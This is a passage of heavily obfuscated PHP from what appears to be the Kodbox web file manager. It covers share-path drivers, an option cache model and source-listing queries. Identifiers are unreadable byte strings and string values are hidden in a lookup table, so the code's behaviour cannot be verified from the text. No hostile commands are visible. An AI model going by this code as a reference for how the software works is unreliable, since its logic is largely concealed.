PathDriverDB { public function __construct($»Ç»è) { $this->pathParse = $»Ç»è; $this->model = Model($_SERVER[Îûáû“ş][1341]); } protected function infoParse($Ó¢Ö§‹Ü, $‚ìœİñ = false, $ŒÁ…“çË = false) { $ËöÎıºí =& $_SERVER[Îûáû“ş]; return Action($ËöÎıºí[1176])->sharePathInfo($this->pathParse[$ËöÎıºí[84]], !0, $‚ìœİñ); } public function listPath($¥Ç…¯è«, $‡»é¢©‰ = false) { $‡¥ÙóÃ =& $_SERVER[Îûáû“ş]; $¼¥ƒß¿Ä = parent::listPath($¥Ç…¯è«, $‡»é¢©‰); if (!$¼¥ƒß¿Ä) { return $¼¥ƒß¿Ä; } if (is_array($¼¥ƒß¿Ä[$‡¥ÙóÃ[1350]])) { $¼¥ƒß¿Ä[$‡¥ÙóÃ[1350]] = Action($‡¥ÙóÃ[1176])->shareItemInfo($¼¥ƒß¿Ä[$‡¥ÙóÃ[1350]]); } foreach ($¼¥ƒß¿Ä as $†ü¥ó£ => $íÛ—£İ) { if (!in_array($†ü¥ó£, array($‡¥ÙóÃ[83], $‡¥ÙóÃ[82]))) { continue; } foreach ($íÛ—£İ as $šñï·ïÆ => $ÔïêÙ‰») { $¼¥ƒß¿Ä[$†ü¥ó£][$šñï·ïÆ] = Action($‡¥ÙóÃ[1176])->shareItemInfo($ÔïêÙ‰»); } } return $¼¥ƒß¿Ä; } public function listAll($ëµÍ¤…’) { $÷ô·»›ü =& $_SERVER[Îûáû“ş]; $ßÒ×ä­­ = IO::info($this->pathParse[$÷ô·»›ü[84]]); if (!$ßÒ×ä­­) { return array(); } $ë”¨‚Ğ = $this->model->listAll($ëµÍ¤…’); foreach ($ë”¨‚Ğ as &$—¨ğÆ‹Ä) { $—¨ğÆ‹Ä[$÷ô·»›ü[87]] = Action($÷ô·»›ü[1176])->shareItemInfo($—¨ğÆ‹Ä[$÷ô·»›ü[87]]); } unset($—¨ğÆ‹Ä); return $ë”¨‚Ğ; } } class PathDriverDriverShareItem { public function __construct($¦±–Â­İ) { $this->pathParse = $¦±–Â­İ; } public function __call($ÄÉ¢©”À, $ø‹åÖÉı) { $Í¸„º¼ =& $_SERVER[Îûáû“ş]; if (method_exists($this, $ÄÉ¢©”À)) { return; } $ò§Ã»êİ = call_user_func_array(array($Í¸„º¼[1351], $ÄÉ¢©”À), $ø‹åÖÉı); $Ü¾ŸÎÆ = array($Í¸„º¼[1352], $Í¸„º¼[1353], $Í¸„º¼[1354], $Í¸„º¼[1355], $Í¸„º¼[546], $Í¸„º¼[548], $Í¸„º¼[1356], $Í¸„º¼[107], $Í¸„º¼[1357], $Í¸„º¼[1358]); if (in_array($ÄÉ¢©”À, $Ü¾ŸÎÆ)) { $ò§Ã»êİ = $this->getPathOuter($ò§Ã»êİ); } return $ò§Ã»êİ; } public function copy($”‘Äå¶±, $êÏÌ›­í, $å…¸Éß÷ = false, $úŒ“÷¯ª = false) { return $this->copyMove($”‘Äå¶±, $êÏÌ›­í, $å…¸Éß÷, $_SERVER[Îûáû“ş][546], $úŒ“÷¯ª); } public function move($¹ïë­èä, $Ùä¾÷ã, $ÓŒ”ö¤ú = false, $©ãßøŒ£ = false) { return $this->copyMove($¹ïë­èä, $Ùä¾÷ã, $ÓŒ”ö¤ú, $_SERVER[Îûáû“ş][548], $©ãßøŒ£); } private function copyMove($“÷ºûºö, $‚ûº¡²ª, $ˆ°¹‹ì•, $ä‹äó, $¾£¦êıñ = false) { $£É÷Å€Â =& $_SERVER[Îûáû“ş]; $Ü­¢„ïÙ = $‚ûº¡²ª; $Õ€ëäˆ = IO::driverMake($‚ûº¡²ª); if ($Õ€ëäˆ->pathParse[$£É÷Å€Â[1153]]) { $‚ûº¡²ª = $Õ€ëäˆ->pathParse[$£É÷Å€Â[1153]]; } else { $‚ûº¡²ª = $Ü­¢„ïÙ; } $ê½²úñ = IO::copyMove($“÷ºûºö, $‚ûº¡²ª, $ˆ°¹‹ì•, $ä‹äó, $¾£¦êıñ); $ê½²úñ = $this->getPathOuter($ê½²úñ); return $ê½²úñ; } public function pathThis($ĞÁ¦ñ°ï) { return get_path_this($this->pathParse[$_SERVER[Îûáû“ş][84]]); } public function pathFather($¤ğ±±Õ) { return get_path_father($this->pathParse[$_SERVER[Îûáû“ş][84]]); } public function iconvSystem($‰Ğ€ò˜) { return $‰Ğ€ò˜; } protected function infoParse($ãÂÕ©ãĞ, $É±÷¨—“ = false) { $ñûÎ€õ =& $_SERVER[Îûáû“ş]; $Ãæ¦İ”Ğ = $this->pathParse[$ñûÎ€õ[486]][$ñûÎ€õ[1177]] . $this->pathParse[$ñûÎ€õ[1170]]; if ($É±÷¨—“) { $ñ’öÔ = IO::infoWithChildren($Ãæ¦İ”Ğ); } else { $ñ’öÔ = IO::info($Ãæ¦İ”Ğ); } $¥Æ¸šÌÊ = $this->pathParse[$ñûÎ€õ[486]]; return Action($ñûÎ€õ[1349])->_shareItemeParse($ñ’öÔ, $¥Æ¸šÌÊ); } public function listAll($Š¿·Ÿ—è) { $Ø¡°ÍÉ§ =& $_SERVER[Îûáû“ş]; $ËöøÜ±¢ = IO::listAll($Š¿·Ÿ—è); $¶ÎÑí³ = rtrim($this->pathParse[$Ø¡°ÍÉ§[486]][$Ø¡°ÍÉ§[1177]], $Ø¡°ÍÉ§[8]); foreach ($ËöøÜ±¢ as &$ë²²ßá¶) { $ë²²ßá¶[$Ø¡°ÍÉ§[84]] = $this->pathDriver . $Ø¡°ÍÉ§[8] . ltrim(substr($ë²²ßá¶[$Ø¡°ÍÉ§[84]], strlen($¶ÎÑí³)), $Ø¡°ÍÉ§[8]); } unset($ë²²ßá¶); return $ËöøÜ±¢; } public function listAllSimple($Ÿ¥½¡æÁ, $¡¾óàê = false) { $…‹ÕèÒî =& $_SERVER[Îûáû“ş]; $±‚í³ˆÔ = $this->listAll($Ÿ¥½¡æÁ); $ÖëË–‰Ú = $this->pathParse[$…‹ÕèÒî[421]]; if (trim($ÖëË–‰Ú, $…‹ÕèÒî[8]) == trim(get_path_father($ÖëË–‰Ú), $…‹ÕèÒî[8])) { $¡¾óàê = !0; } return IO::init($…‹ÕèÒî[12])->listAllSimpleMake($±‚í³ˆÔ, $ÖëË–‰Ú, $¡¾óàê); } public function getPathOuter($úºªç³Õ) { $¤‹‚†³ş =& $_SERVER[Îûáû“ş]; $å·¦‹Áâ = KodIO::parse($úºªç³Õ); if ($å·¦‹Áâ[$¤‹‚†³ş[33]] == KodIO::KOD_SHARE_ITEM) { return $å·¦‹Áâ[$¤‹‚†³ş[84]]; } $¢“¡±Ùê = KodIO::clear($úºªç³Õ); $İóÆÃ§Ö = KodIO::clear($this->pathParse[$¤‹‚†³ş[486]][$¤‹‚†³ş[1177]]); $¢×É² = substr($¢“¡±Ùê, strlen($İóÆÃ§Ö)); if (substr($¢“¡±Ùê, 0, strlen($İóÆÃ§Ö)) != $İóÆÃ§Ö) { return !1; } return $this->pathParse[$¤‹‚†³ş[1171]] . $¤‹‚†³ş[8] . ltrim($¢×É², $¤‹‚†³ş[8]); } public function getType() { $¥²·åØı =& $_SERVER[Îûáû“ş]; $©•½™Í… = str_replace($¥²·åØı[74], $¥²·åØı[12], get_class($this)); return strtolower($©•½™Í…); } public function isTypeObject($†‘ïÜÉí) { return IO::isTypeObject($†‘ïÜÉí); } public function info($ßÚ®ı…¡) { return $this->infoParse($ßÚ®ı…¡); } public function infoAuth($³Øûıï”) { return $this->infoParse($³Øûıï”); } public function infoWithChildren($øõ‹óá†) { return $this->infoParse($øõ‹óá†, !0); } public function infoFull($ßûéÆç) { return $this->infoParse($ßûéÆç); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($ëºÜÌİÓ) { $this->pathParse = $ëºÜÌİÓ; } protected function infoParse($©Ìªò¥, $òäÚ‹²É = false) { $¿”‰¦‹ =& $_SERVER[Îûáû“ş]; return Action($¿”‰¦‹[1176])->sharePathInfo($this->pathParse[$¿”‰¦‹[84]], !0, $òäÚ‹²É); } public function listPath($Ó²°ÂÔ…, $šÙóüı = false) { $ÚÂ‹Ñ‘… =& $_SERVER[Îûáû“ş]; $‡š˜¼• = IO::listPath($Ó²°ÂÔ…, $šÙóüı); if (!$‡š˜¼•) { return $‡š˜¼•; } if (is_array($‡š˜¼•[$ÚÂ‹Ñ‘…[1350]])) { $šº‡¹Èú = Action($ÚÂ‹Ñ‘…[1359])->parsePathChildren($‡š˜¼•[$ÚÂ‹Ñ‘…[1350]], array($ÚÂ‹Ñ‘…[421] => $Ó²°ÂÔ…)); $‡š˜¼•[$ÚÂ‹Ñ‘…[1350]] = Action($ÚÂ‹Ñ‘…[1176])->shareItemInfo($šº‡¹Èú); } foreach ($‡š˜¼• as $×íäÇ‚· => $Å½‚Äî‡) { if (!in_array($×íäÇ‚·, array($ÚÂ‹Ñ‘…[83], $ÚÂ‹Ñ‘…[82]))) { continue; } foreach ($Å½‚Äî‡ as $Ü¢˜ºî½ => $šº‡¹Èú) { $šº‡¹Èú = Action($ÚÂ‹Ñ‘…[1359])->parsePathChildren($šº‡¹Èú, array($ÚÂ‹Ñ‘…[421] => $Ó²°ÂÔ…)); $‡š˜¼•[$×íäÇ‚·][$Ü¢˜ºî½] = Action($ÚÂ‹Ñ‘…[1176])->shareItemInfo($šº‡¹Èú); } } return $‡š˜¼•; } } goto CãœŠÄ«; aÌ­¼ ¶‘›: class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($‡„é€¤÷ = false, $¥´¢ßèª = '', $¼ÍêãÀ = false) { $†‹ô¿©‚ =& $_SERVER[Îûáû“ş]; $‹İü€“­ = $this->cacheGet($¥´¢ßèª); $†¨û™‘ˆ = $this->optionDefault($¥´¢ßèª); $†¨û™‘ˆ = is_array($†¨û™‘ˆ) ? $†¨û™‘ˆ : array(); if (is_array($‹İü€“­)) { $‹İü€“­ = array_merge($†¨û™‘ˆ, $‹İü€“­); return $‡„é€¤÷ ? isset($‹İü€“­[$‡„é€¤÷]) ? $‹İü€“­[$‡„é€¤÷] : null : $‹İü€“­; } $Ÿ°æÇÆ¬ = $this->filterWhere(array($†‹ô¿©‚[33] => $¥´¢ßèª)); $‹İü€“­ = $this->where($Ÿ°æÇÆ¬)->select(); $‹İü€“­ = array_to_keyvalue($‹İü€“­, $†‹ô¿©‚[94], $†‹ô¿©‚[374]); foreach ($‹İü€“­ as $‡ÜòÖÂæ => $Û£Éºì–) { if ($¼ÍêãÀ || in_array($‡ÜòÖÂæ, $this->jsonField)) { $‹İü€“­[$‡ÜòÖÂæ] = json_decode($Û£Éºì–, !0); } } $this->cacheSet($¥´¢ßèª, $‹İü€“­); $‹İü€“­ = array_merge($†¨û™‘ˆ, $‹İü€“­); return $‡„é€¤÷ ? $‹İü€“­[$‡„é€¤÷] : $‹İü€“­; } public function set($÷ï“Æ¹ı, $½ÚË›ş = false, $ ûÁˆÈ’ = '') { $¸ùÈ¬ï =& $_SERVER[Îûáû“ş]; $this->cacheRemove($ ûÁˆÈ’); $ÌÁ«éÅ = array(); $³¼ÈÏò¹ = is_array($÷ï“Æ¹ı) ? $÷ï“Æ¹ı : array($÷ï“Æ¹ı => $½ÚË›ş); foreach ($³¼ÈÏò¹ as $Ñ°ƒ Ä¨ => $¶±Ôª¹°) { if (is_array($¶±Ôª¹°)) { $¶±Ôª¹° = json_encode_force($¶±Ôª¹°); } $this->checkLength($¶±Ôª¹°, !1, $this->tableName . $¸ùÈ¬ï[4] . $÷ï“Æ¹ı); $¶±Ôª¹° = self::textEncode($¶±Ôª¹°); $³¼ÈÏò¹ = array($¸ùÈ¬ï[33] => $ ûÁˆÈ’, $¸ùÈ¬ï[94] => $Ñ°ƒ Ä¨, $¸ùÈ¬ï[374] => $¶±Ôª¹°); $ÌÁ«éÅ[] = $this->filterWhere($³¼ÈÏò¹); } if (!$ÌÁ«éÅ) { return !0; } $¬ãØèÅĞ = $this->cacheKey($¸ùÈ¬ï[400]); CacheLock::lock($¬ãØèÅĞ); $Æş­¸éØ = $this->addAll($ÌÁ«éÅ, array(), !0); CacheLock::unlock($¬ãØèÅĞ); return $Æş­¸éØ; } protected function optionDefault($Ğå‡Ò² = '') { return !1; } public function setDeep($¦„ª…, $Ì†¬Ñ†Ù = false, $£éØ¶ëÒ = '') { $Ì¯¡É©û = explode($_SERVER[Îûáû“ş][10], $¦„ª…); $ç¹’Æ†å = $this->get(); array_set_value($ç¹’Æ†å, $¦„ª…, $Ì†¬Ñ†Ù); $this->set($Ì¯¡É©û[0], $ç¹’Æ†å[$Ì¯¡É©û[0]], $£éØ¶ëÒ); } public function remove($äñ£á‹€, $ïñ°§Î‹ = '') { $§€Üóä® =& $_SERVER[Îûáû“ş]; $this->cacheRemove($ïñ°§Î‹); $œ’öœ–Ò = $this->filterWhere(array($§€Üóä®[94] => $äñ£á‹€, $§€Üóä®[33] => $ïñ°§Î‹)); if (is_null($äñ£á‹€)) { unset($œ’öœ–Ò[$§€Üóä®[94]]); } return $this->where($œ’öœ–Ò)->delete(); } public function cacheSet($¡ŒêÛû, $åÌÑ±¤Ä = false) { return Cache::set($this->cacheKey($¡ŒêÛû), $åÌÑ±¤Ä); } public function cacheGet($ĞĞÆãÄÒ) { return Cache::get($this->cacheKey($ĞĞÆãÄÒ)); } public function cacheRemove($Äë¬½) { return Cache::remove($this->cacheKey($Äë¬½)); } protected function filterWhere($Ñˆõ´À½) { return $Ñˆõ´À½; } protected function cacheKey($–òÁÄª™) { return $–òÁÄª™; } } class SourceListModel extends ModelBase { protected $tableName = "\x69\x6f\137\x73\x6f\165\162\x63\x65"; protected $tableMeta = array("\x74\x61\142\x6c\x65\116\141\155\x65" => "\151\x6f\137\x73\x6f\165\162\x63\145\137\x6d\x65\x74\x61", "\155\x65\x74\x61\x46\151\145\154\x64" => "\163\x6f\x75\x72\x63\x65\x49\104"); protected $dataAuto = array(array("\155\x6f\x64\151\x66\x79\124\151\x6d\x65", "\164\151\155\145", "\x69\x6e\163\x65\x72\164", "\x66\x75\x6e\x63\164\x69\x6f\x6e"), array("\x63\x72\x65\141\164\145\124\x69\x6d\x65", "\164\151\155\145", "\x69\156\x73\x65\x72\x74", "\x66\x75\x6e\143\x74\x69\157\x6e"), array("\x76\x69\x65\x77\x54\151\x6d\x65", "\x74\x69\155\x65", "\x69\x6e\163\145\162\x74", "\x66\165\156\x63\164\151\x6f\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($š×É) { return $this->listSource(array($_SERVER[Îûáû“ş][401] => $š×É)); } public function typeName($‰ö­¾¿) { static $¥È¹Â´Ü = array(self::TYPE_SYSTEM => "\163\171\x73\164\x65\155", self::TYPE_USER => "\x75\163\x65\162", self::TYPE_GROUP => "\147\162\x6f\x75\x70"); return $¥È¹Â´Ü[$‰ö­¾¿ . $_SERVER[Îûáû“ş][12]]; } public function sourceListInfo($°½¨ä®, $€ÈŠ€ãÙ = false) { $¿±Ê£åÄ =& $_SERVER[Îûáû“ş]; $°½¨ä® = $°½¨ä® ? $°½¨ä® : array(); $°½¨ä® = array_filter(array_unique($°½¨ä®)); if (!$°½¨ä®) { return array(); } $Ù£—Á = $this->where(array($¿±Ê£åÄ[402] => array($¿±Ê£åÄ[7], $°½¨ä®)))->select(); $this->_listDataApply($Ù£—Á, $€ÈŠ€ãÙ); return array_to_keyvalue($Ù£—Á, $¿±Ê£åÄ[402]); } public function pathInfoFilter(&$Ôù­è„) { $Û®õˆ =& $_SERVER[Îûáû“ş]; static $…×Ê±ÊÔ = false; static $ùğÉáµ› = false; static $ßüİ‡ğ– = false; if (!$…×Ê±ÊÔ) { $‡½œ…ŸÓ = $Û®õˆ[403]; $‡½œ…ŸÓ .= $Û®õˆ[404]; $‡½œ…ŸÓ .= $Û®õˆ[405]; $‹–çÔêÙ = $Û®õˆ[406]; $¤Ôø³è = explode($Û®õˆ[50], $‹–çÔêÙ); $…×Ê±ÊÔ = explode($Û®õˆ[50], $‡½œ…ŸÓ); $ùğÉáµ› = array(); foreach ($…×Ê±ÊÔ as $ş¥Ç„‰) { if (in_array($ş¥Ç„‰, $¤Ôø³è)) { continue; } $ùğÉáµ›[] = $ş¥Ç„‰; } $ßüİ‡ğ– = explode($Û®õˆ[50], $Û®õˆ[407]); } foreach ($ßüİ‡ğ– as $Ãû¢¨š) { if (isset($Ôù­è„[$Ãû¢¨š])) { $Ôù­è„[$Ãû¢¨š] = intval($Ôù­è„[$Ãû¢¨š]); } } $Ôù­è„[$Û®õˆ[84]] = $Û®õˆ[408] . $Ôù­è„[$Û®õˆ[402]] . $Û®õˆ[409]; $Ôù­è„[$Û®õˆ[33]] = $Ôù­è„[$Û®õˆ[410]] == 1 ? $Û®õˆ[75] : $Û®õˆ[200]; $Ôù­è„[$Û®õˆ[411]] = $this->typeName($Ôù­è„[$Û®õˆ[411]]); if ($Ôù­è„[$Û®õˆ[410]] != 1) { $Ôù­è„[$Û®õˆ[174]] = $Ôù­è„[$Û®õˆ[412]]; unset($Ôù­è„[$Û®õˆ[412]]); } $Ï¸€ı®å = $…×Ê±ÊÔ; if (isset($Ôù­è„[$Û®õˆ[413]]) && $Ôù­è„[$Û®õˆ[413]][$Û®õˆ[414]] == -1) { $Ï¸€ı®å = $ùğÉáµ›; } $Ôù­è„ = array_field_key($Ôù­è„, $Ï¸€ı®å); return $Ôù­è„; } public function listUserFav() { $•Áªá¿Š =& $_SERVER[Îûáû“ş]; $¨¹—Ó›“ = Model($•Áªá¿Š[415])->listData(); $ÈÀ¯‘µÚ = array_filter_by_field($¨¹—Ó›“, $•Áªá¿Š[33], $•Áªá¿Š[416]); $ÈÀ¯‘µÚ = array_to_keyvalue($ÈÀ¯‘µÚ, $•Áªá¿Š[12], $•Áªá¿Š[84]); if ($ÈÀ¯‘µÚ) { $Ò­ƒî¡ß = $this->listSource(array($•Áªá¿Š[417] => array($•Áªá¿Š[418], $ÈÀ¯‘µÚ))); } $Ò­ƒî¡ß = array_to_keyvalue($Ò­ƒî¡ß[$•Áªá¿Š[369]], $•Áªá¿Š[402]); foreach ($¨¹—Ó›“ as &$Üá¬‚ù¯) { $Üá¬‚ù¯ = array($•Áªá¿Š[419] => $Üá¬‚ù¯[$•Áªá¿Š[399]], $•Áªá¿Š[420] => $Üá¬‚ù¯[$•Áªá¿Š[32]], $•Áªá¿Š[421] => $Üá¬‚ù¯[$•Áªá¿Š[84]], $•Áªá¿Š[422] => $Üá¬‚ù¯[$•Áªá¿Š[33]], $•Áªá¿Š[423] => $Üá¬‚ù¯[$•Áªá¿Š[201]], $•Áªá¿Š[424] => $Üá¬‚ù¯[$•Áªá¿Š[85]]); if ($Üá¬‚ù¯[$•Áªá¿Š[33]] == $•Áªá¿Š[416] && $Ò­ƒî¡ß[$Üá¬‚ù¯[$•Áªá¿Š[84]]]) { $Üá¬‚ù¯[$•Áªá¿Š[87]] = $Ò­ƒî¡ß[$Üá¬‚ù¯[$•Áªá¿Š[84]]]; } } unset($Üá¬‚ù¯); return $¨¹—Ó›“; } public function listUserTag($š’Øá–á) { $ó©Ç™‚ø =& $_SERVER[Îûáû“ş]; if ($š’Øá–á && !is_array($š’Øá–á)) { $š’Øá–á = array($š’Øá–á); } $ò¥ ÂÌ‹ = Model($ó©Ç™‚ø[425])->listData(); $ÜîÕ÷ ÷ = array(); $Šãü”ŒÃ = array(); foreach ($ò¥ ÂÌ‹ as $»ú¢Ò¬¶) { $ÂğßºŒ† = $»ú¢Ò¬¶[$ó©Ç™‚ø[84]]; if (!$ÂğßºŒ†) { continue; } if (!isset($Šãü”ŒÃ[$ÂğßºŒ†])) { $Šãü”ŒÃ[$ÂğßºŒ†] = array(); } $Šãü”ŒÃ[$ÂğßºŒ†][] = $»ú¢Ò¬¶[$ó©Ç™‚ø[426]]; $ÜîÕ÷ ÷[$»ú¢Ò¬¶[$ó©Ç™‚ø[84]]] = $»ú¢Ò¬¶; } $Â¾•õ = array(); $¸éùç˜Æ = array(); $îâóÅı = array(); foreach ($Šãü”ŒÃ as $÷™ÔÆí¨ => $´…»Š¦Ò) { $æ½«Ú³° = !0; if (!$š’Øá–á) { $Â¾•õ[] = $÷™ÔÆí¨; continue; } foreach ($š’Øá–á as $’Ç¶Úú«) { if (!in_array($’Ç¶Úú«, $´…»Š¦Ò)) { $æ½«Ú³° = !1; break; } } if (!$æ½«Ú³°) { continue; } if (!is_numeric($÷™ÔÆí¨)) { $ÄƒØúã = $ÜîÕ÷ ÷[$÷™ÔÆí¨]; $‚ÈĞÉ‘ú = array($ó©Ç™‚ø[32] => $ÄƒØúã[$ó©Ç™‚ø[32]], $ó©Ç™‚ø[84] => $ÄƒØúã[$ó©Ç™‚ø[84]], $ó©Ç™‚ø[33] => $ÄƒØúã[$ó©Ç™‚ø[33]], $ó©Ç™‚ø[87] => array($ó©Ç™‚ø[427] => 1), $ó©Ç™‚ø[202] => !0); if ($ÄƒØúã[$ó©Ç™‚ø[33]] == $ó©Ç™‚ø[200]) { $îâóÅı[] = $‚ÈĞÉ‘ú; } if ($ÄƒØúã[$ó©Ç™‚ø[33]] == $ó©Ç™‚ø[75]) { $¸éùç˜Æ[] = $‚ÈĞÉ‘ú; } continue; } $Â¾•õ[] = $÷™ÔÆí¨; } if ($Â¾•õ) { $Óù¿³… = $this->listSource(array($ó©Ç™‚ø[417] => array($ó©Ç™‚ø[418], $Â¾•õ))); } $Óù¿³… = $Óù¿³… ? $Óù¿³… : array($ó©Ç™‚ø[82] => array(), $ó©Ç™‚ø[83] => array()); $Óù¿³…[$ó©Ç™‚ø[82]] = array_merge($Óù¿³…[$ó©Ç™‚ø[82]], $¸éùç˜Æ); $Óù¿³…[$ó©Ç™‚ø[83]] = array_merge($Óù¿³…[$ó©Ç™‚ø[83]], $îâóÅı); if (isset($Óù¿³…[$ó©Ç™‚ø[366]]) && count($Â¾•õ) == $Óù¿³…[$ó©Ç™‚ø[366]][$ó©Ç™‚ø[367]]) { return $Óù¿³…; } $©ÉÜÛ = array(); $Õé­Ü‰‹ = array_to_keyvalue($Óù¿³…[$ó©Ç™‚ø[82]], $ó©Ç™‚ø[12], $ó©Ç™‚ø[402]); $í´îÛ = array_to_keyvalue($Óù¿³…[$ó©Ç™‚ø[83]], $ó©Ç™‚ø[12], $ó©Ç™‚ø[402]); $àõö”× = array_merge($í´îÛ, $Õé­Ü‰‹); foreach ($Â¾•õ as $ÂğßºŒ†) { if (!in_array($ÂğßºŒ†, $àõö”×)) { $©ÉÜÛ[] = $ÂğßºŒ†; } } if ($©ÉÜÛ) { Model($ó©Ç™‚ø[428])->removeBySource($©ÉÜÛ); } return $Óù¿³…; } public function listUserRecycle() { $œåœ›‡’ =& $_SERVER[Îûáû“ş]; $¢´Ğ·Ñ = Model($œåœ›‡’[429])->listData(); if (!$¢´Ğ·Ñ) { return array(); } $ªĞ¦è™ö = array($œåœ›‡’[417] => array($œåœ›‡’[418], $¢´Ğ·Ñ), $œåœ›‡’[430] => 1); return $this->listSource($ªĞ¦è™ö); } public function listSource($ë÷—±ı², $“í¥üãœ = 3000, $Î„üå¬ = false) { $÷º›ÓÏª =& $_SERVER[Îûáû“ş]; if (!isset($ë÷—±ı²[$÷º›ÓÏª[431]])) { $ë÷—±ı²[$÷º›ÓÏª[431]] = 0; } if (isset($ë÷—±ı²[$÷º›ÓÏª[432]]) && $ë÷—±ı²[$÷º›ÓÏª[432]] == $÷º›ÓÏª[198]) { $ë÷—±ı²[$÷º›ÓÏª[412]] = array($÷º›ÓÏª[331], $÷º›ÓÏª[433]); } $×ëôÒ = $÷º›ÓÏª[434]; $çîã°“ = $this->field($×ëôÒ)->_makeOrder()->where($ë÷—±ı²)->selectPage($“í¥üãœ); $this->_listPageCheck($çîã°“, $×ëôÒ, $ë÷—±ı²); $this->_listDataApply($çîã°“[$÷º›ÓÏª[369]], $Î„üå¬); $this->_listMake($çîã°“); return $çîã°“; } private function _listPageCheck(&$¨Ğô Ü‘, $ŞããÒ¯Ò, $¼’×Õ¬â) { $Ş€“Üğ· =& $_SERVER[Îûáû“ş]; if (!is_array($¨Ğô Ü‘[$Ş€“Üğ·[366]])) { return; } $í˜¢¯’€ = $¨Ğô Ü‘[$Ş€“Üğ·[366]]; if ($í˜¢¯’€[$Ş€“Üğ·[368]] <= 1) { return; } if ($í˜¢¯’€[$Ş€“Üğ·[367]] >= 100000) { return; } if (Model($Ş€“Üğ·[435])->get($Ş€“Üğ·[436]) != $Ş€“Üğ·[437]) { return; } $ŞããÒ¯Ò = str_replace(array($Ş€“Üğ·[53], $Ş€“Üğ·[342], $Ş€“Üğ·[231]), $Ş€“Üğ·[12], $ŞããÒ¯Ò); $ŞããÒ¯Ò = $Ş€“Üğ·[438] . str_replace($Ş€“Üğ·[50], $Ş€“Üğ·[439], $ŞããÒ¯Ò) . $Ş€“Üğ·[440]; $†¼Ï™¬ß = $Ş€“Üğ·[441]; $†¼Ï™¬ß = $†¼Ï™¬ß . $Ş€“Üğ·[442]; $ÀÌ©óã = $í˜¢¯’€[$Ş€“Üğ·[363]] * ($í˜¢¯’€[$Ş€“Üğ·[353]] - 1) . $Ş€“Üğ·[50] . $í˜¢¯’€[$Ş€“Üğ·[363]]; $âáùêÔš = $this->_makeOrder(!0); $Ï‘çãÔ® = $Ş€“Üğ·[438] . str_replace($Ş€“Üğ·[50], $Ş€“Üğ·[439], $âáùêÔš[0]); if (strpos($Ï‘çãÔ®, $Ş€“Üğ·[443])) { $Ï‘çãÔ® = str_replace($Ş€“Üğ·[443], $Ş€“Üğ·[444], $Ï‘çãÔ®); } else { $Ï‘çãÔ® .= $Ş€“Üğ·[445] . $âáùêÔš[1]; } $ÊåÒ¦Ü = array(); foreach ($¼’×Õ¬â as $ø™¯û¸Š => $ïŠé¿•Î) { $ÊåÒ¦Ü[$Ş€“Üğ·[438] . $ø™¯û¸Š] = $ïŠé¿•Î; } $this->alias($Ş€“Üğ·[446])->field($ŞããÒ¯Ò)->limit($ÀÌ©óã)->order($Ï‘çãÔ®); $¬¥ÜĞÛ = $this->join($†¼Ï™¬ß)->where($ÊåÒ¦Ü)->select(); if ($¬¥ÜĞÛ) { $¨Ğô Ü‘[$Ş€“Üğ·[369]] = $¬¥ÜĞÛ; } } protected function _makeOrder($×•©·ú = false) { $ÁÔ”øò£ =& $_SERVER[Îûáû“ş]; $£¥ÜéÄÉ = Model($ÁÔ”øò£[447])->get($ÁÔ”øò£[448]); $šíÅ˜‹ = Model($ÁÔ”øò£[447])->get($ÁÔ”øò£[449]); $Ï×šŞê = array($ÁÔ”øò£[450] => $ÁÔ”øò£[451], $ÁÔ”øò£[452] => $ÁÔ”øò£[453]); $‰ùƒßÆ‹ = array($ÁÔ”øò£[32] => $ÁÔ”øò£[32], $ÁÔ”øò£[76] => $ÁÔ”øò£[76], $ÁÔ”øò£[174] => $ÁÔ”øò£[412], $ÁÔ”øò£[454] => $ÁÔ”øò£[454], $ÁÔ”øò£[455] => $ÁÔ”øò£[456], $ÁÔ”øò£[201] => $ÁÔ”øò£[201], $ÁÔ”øò£[85] => $ÁÔ”øò£[85]); $®©®ù™« = Input::get($ÁÔ”øò£[457], $ÁÔ”øò£[7], $£¥ÜéÄÉ, array_keys($‰ùƒßÆ‹)); $·ÌÏÜâÍ = Input::get($ÁÔ”øò£[458], $ÁÔ”øò£[7], $šíÅ˜‹, array_keys($Ï×šŞê)); if (!in_array($®©®ù™«, array_keys($‰ùƒßÆ‹))) { $®©®ù™« = $ÁÔ”øò£[32]; } if (!in_array($·ÌÏÜâÍ, array_keys($Ï×šŞê))) { $®©®ù™« = $ÁÔ”øò£[450]; } if ($®©®ù™« == $ÁÔ”øò£[32]) { } $Û€Ş‰£ = $ÁÔ”øò£[459] . $‰ùƒßÆ‹[$®©®ù™«] . $ÁÔ”øò£[53] . $Ï×šŞê[$·ÌÏÜâÍ]; $Û€Ş‰£ = rtrim(trim($Û€Ş‰£), $ÁÔ”øò£[50]); if ($×•©·ú) { return array($Û€Ş‰£, $Ï×šŞê[$·ÌÏÜâÍ]); } return $this->order($Û€Ş‰£); } protected function _listDataApplyItem($”Íë¾¦÷, $êĞÚç = false) { $öÑı—¸ = array($”Íë¾¦÷); $this->_listDataApply($öÑı—¸, $êĞÚç); return $öÑı—¸[0]; } protected function _listDataApply(&$­Ë¡·³¥, $»”ÙãÆ½ = false) { $çœ®Òñ÷ =& $_SERVER[Îûáû“ş]; if (!$­Ë¡·³¥) { $­Ë¡·³¥ = array(); return; } $†ÚÌº¥¶ = array_to_keyvalue($­Ë¡·³¥, $çœ®Òñ÷[12], $çœ®Òñ÷[402]); $†ÚÌº¥¶ = array_unique($†ÚÌº¥¶); $this->_listSourceCache($­Ë¡·³¥); if (!$»”ÙãÆ½) { $this->_listAppendMeta($­Ë¡·³¥, $†ÚÌº¥¶); $this->_listAppendFileMeta($­Ë¡·³¥, $†ÚÌº¥¶); $this->_listAppendChildren($­Ë¡·³¥, $†ÚÌº¥¶); } $this->_listAppendPath($­Ë¡·³¥); $this->_listAppendAuth($­Ë¡·³¥); $this->_listAppendSourceInfo($­Ë¡·³¥, $†ÚÌº¥¶); $this->_listAppendUser($­Ë¡·³¥); $this->_listFilterInfo($­Ë¡·³¥, $»”ÙãÆ½); $this->_listAppendAuthSecret($­Ë¡·³¥); } protected function _listSourceCache($ÆŞá´à) { $êçñË›ä =& $_SERVER[Îûáû“ş]; foreach ($ÆŞá´à as $ù°¦àß²) { self::$cacheSourceInfo[$êçñË›ä[460] . $ù°¦àß²[$êçñË›ä[402]]] = $ù°¦àß²; } } protected function 